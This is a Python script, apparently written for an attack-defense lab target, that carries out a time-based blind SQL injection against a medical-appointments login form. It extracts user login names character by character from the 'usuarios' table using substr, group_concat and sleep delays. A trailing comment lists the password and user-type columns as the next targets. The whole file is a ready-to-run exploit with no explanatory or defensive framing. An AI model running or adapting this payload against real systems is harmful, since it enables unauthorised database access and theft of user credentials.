import requests
import time

url = "https://jh0egcgctc8iiy7n3d8fq.ap-southeast-6.attackdefensecloudlabs.com/citasmedicas.php?pag=citasmedindex"
payload_list = [' ',0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
result=''

def request_test(url,count=0,num=0):
    payload = {
        "username": f"' or substr((SELECT group_concat(login separator ' ') from usuarios),{count},1) = '{num}' and sleep(0.18)#",
        "password": "something"
    }

    # Measure the start time
    start_time = time.time()

    # Send the POST request with headers and data
    response = requests.post(url, data=payload)

    # Measure the end time
    end_time = time.time()

    # Calculate the elapsed time
    elapsed_time = end_time - start_time

    # Print the status code, response text, and response time
    print(f"Response Time: {elapsed_time} seconds")
    if float(elapsed_time) > 1:
        print(f"Response Time: {elapsed_time} seconds")
        return True


for i in range(25,1000):
    for j in payload_list:
        print(f'trying place{i} with {j}')
        if request_test(url,i,j):
            print('Succeed : '+str(i))
            result+=str(j)
            print(result)
            break

#codigo+login+password+cod_tp_usr

